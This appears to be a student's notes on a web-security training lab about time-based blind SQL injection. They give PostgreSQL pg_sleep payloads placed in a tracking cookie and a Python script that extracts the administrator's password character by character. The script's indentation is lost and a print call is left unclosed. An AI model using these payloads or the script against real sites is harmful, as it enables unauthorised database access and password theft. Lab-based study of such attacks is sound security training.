

# Lab: Blind SQL injection with time delays and information retrieval

PRACTITIONER
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.
```sql
#sql normal para validar : 
' %3b select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(3) else pg_sleep(0) end from users-- -'

#sql normal para validar : 
' %3b select case when (username='administrator' and substring(username,1,1)='a') then pg_sleep(3) else pg_sleep(0) end from users-- -
```

```python
#!/usr/bin/env python3

from datetime import time

  

import time
import requests
import sys
import signal
import string 

def def_handler(sig, frame):
print("\n[!] Exiting..."
sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
characters = string.ascii_lowercase + string.digits

  

def makeSQLI():

# Asegúrate de que esta URL sea exactamente la de tu pestaña actual del laboratorio

url = 'https://0a47003904178d1f8147f77a00c50043.web-security-academy.net/'

print("[+] Iniciando script... Probando caracteres:")

password = ""

for position in range(1, 21):

found = False

for char in characters:

cookies = {

'TrackingId': f"'%3b select case when (username='administrator' and substring(password,{position},1)='{char}') then pg_sleep(3) else pg_sleep(0) end from users-- -",

'session': '6P6XNQBVjPWkLDTABI6rLBWaIHhUrPug'

}

time_start = time.time()

r = requests.get(url, cookies=cookies)

time_end = time.time()

if time_end - time_start > 3:

password += char

print(f"\n[+] ¡ÉXITO! Carácter encontrado en posición {position}: '{char}' --> Contraseña parcial: {password}\n")

found = True

break

if not found:

print(f"\n[+] Búsqueda finalizada. Contraseña completa: {password}")

break

  

if __name__ == '__main__':

makeSQLI()
```


![[class15.png]]